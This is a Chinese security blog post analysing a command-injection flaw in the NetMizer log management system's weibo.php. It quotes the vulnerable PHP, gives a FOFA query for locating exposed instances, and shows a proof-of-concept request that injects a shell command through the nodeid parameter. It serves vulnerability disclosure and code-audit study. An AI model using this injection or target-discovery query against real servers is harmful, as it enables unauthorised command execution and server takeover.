---
title: "NetMizer日志管理系统 weibo.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-weibo-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-weibo.php-命令执行漏洞
---

# NetMizer日志管理系统 weibo.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/20 08:28
- 651浏览
- [0评论](#comment)
- 17分钟阅读

深入探索

防火墙软件

代码安全审计

编程语言教程

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/weibo.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞扫描服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `weibo.php` 业务实现关键逻辑部分

```
<?php
    include('../include/JSON.php');

    $cmd = "/var/www/cgi-bin/search_weibo";

    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
    $start_time = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -s $start_time";
    list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
    $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
    $cmd .= " -e $stop_time";

    if($nodeid != ""){
       $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
       $cmd .= " -n $nodeid";
    } else $sql_nodeid = "";

    $srcip = $src;
    if($srcip == ""){
       $srcid = "-1";
    } else $srcid = ip2long($srcip); 
    if($srcid != "-1"){
       $sql_srcid = " and src_addr = $srcid ";
       $cmd .= " -S $srcid";
    } else {
       $sql_srcid = "";
    }

    $user = $username;
    if($user != ""){
       $sql_user = " and user_name = \"$user\" ";
       $cmd .= " -u $user";
    } else {
       $sql_user = "";
    }

    if($qq != ""){
       $sql_qq = " and wb_uid = $qq ";
       $cmd .= " -q $qq";
    } else {
       $sql_qq = "";
    }

    if($action == 'file'){
       //echo $cmd."\n";
       $fp = @popen($cmd,"r");
```

当 `$action == 'file'` 时，多个参数如 nodeid、username、qq 这些由用户可控并直接拼接到cmd命令中且无任何过滤和校验，然后使用popen执行，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/search/weibo.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 weibo.php 命令执行漏洞](images/img-001-fefaae9b7de5.webp)](https://image.mrxn.net/93f3827c7a9d4cfaa2d957a4156a7f8c.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

计算机安全
